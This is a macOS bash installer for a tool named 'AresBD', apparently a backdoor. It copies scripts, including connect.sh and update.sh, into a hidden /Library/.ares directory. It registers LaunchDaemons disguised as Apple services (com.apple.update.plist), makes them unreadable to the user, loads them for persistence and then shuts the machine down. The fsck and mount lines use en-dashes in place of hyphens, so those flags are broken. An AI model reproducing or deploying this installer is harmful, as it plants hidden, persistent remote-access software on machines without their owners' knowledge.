#!/bin/bash

#  install.sh
#  AresBD
#
#  Copyright (c) 2015 Stsosz Systems. All rights reserved.
#  Don't use this without permission. I'm not responsible
#  for any stupid stuff you do with AresBD.

echo "Running a filesystem check... "
fsck –fy
echo "Done."

echo "Making sure that the filessystem is mounted with read-write access... "
mount –uw /
echo "Done"

echo "Creating directories... "
mkdir -vp /Library/.ares
mkdir -vp /Library/LaunchDaemons
echo "Done."

echo "Copying files..."
cp -v /Volumes/Ares/Files/update.sh /Library/.ares/update.sh
cp -v /Volumes/Ares/Files/connect.sh /Library/.ares/connect.sh
cp -v /Volumes/Ares/Files/ares.conf /Library/.ares/ares.conf

cp -v /Volumes/Ares/Files/com.apple.update.plist /Library/LaunchDaemons/com.apple.update.plist
cp -v /Volumes/Ares/Files/com.apple.ares.plist /Library/LaunchDaemons/com.apple.ares.plist
echo "Done."
echo ""

echo "Making everything executable... "
chmod +x /Library/.ares/connect.sh
chmod +x /Library/.ares/update.sh
echo "Done"
echo ""

echo "Making sure that the user cannot read plists... "
chmod 600 /Library/LaunchDaemons/com.apple.ares.plist
chmod 600 /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Loading plists into LaunchCTL "
launchctl load /Library/LaunchDaemons/com.apple.ares.plist
launchctl load /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Install Complete."
echo ""

echo "Press enter to shut down or CTRL-C to exit..."
read

echo "Shutting down..."
shutdown -h now
